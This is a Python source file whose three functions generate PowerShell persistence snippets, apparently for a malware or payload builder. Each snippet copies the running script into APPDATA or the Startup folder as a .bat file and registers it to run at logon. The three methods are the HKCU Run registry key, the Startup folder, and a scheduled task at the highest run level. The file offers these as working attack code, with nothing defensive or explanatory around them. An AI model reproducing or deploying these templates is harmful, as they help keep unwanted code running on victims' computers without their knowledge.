def registry_run(name):
    return f'''$pd="$env:APPDATA\\{name}"
if(!(Test-Path $pd)){{New-Item -ItemType Directory -Path $pd -Force|Out-Null}}
$bp=(Get-Item $MyInvocation.MyCommand.Definition -ErrorAction SilentlyContinue).FullName
if(!$bp){{$bp=$MyInvocation.MyCommand.Path}}
if($bp){{Copy-Item $bp "$pd\\{name}.bat" -Force
New-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "{name}" -Value "cmd.exe /c `"$pd\\{name}.bat`"" -PropertyType String -Force|Out-Null}}
'''


def startup_folder(name):
    return f'''$sf="$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
$bp=(Get-Item $MyInvocation.MyCommand.Definition -ErrorAction SilentlyContinue).FullName
if(!$bp){{$bp=$MyInvocation.MyCommand.Path}}
if($bp){{Copy-Item $bp "$sf\\{name}.bat" -Force 2>$null}}
'''


def scheduled_task(name):
    return f'''$pd="$env:APPDATA\\{name}"
if(!(Test-Path $pd)){{New-Item -ItemType Directory -Path $pd -Force|Out-Null}}
$bp=(Get-Item $MyInvocation.MyCommand.Definition -ErrorAction SilentlyContinue).FullName
if(!$bp){{$bp=$MyInvocation.MyCommand.Path}}
if($bp){{Copy-Item $bp "$pd\\{name}.bat" -Force
schtasks /create /tn "{name}" /tr "cmd.exe /c `"$pd\\{name}.bat`"" /sc onlogon /rl highest /f 2>$null|Out-Null}}
'''
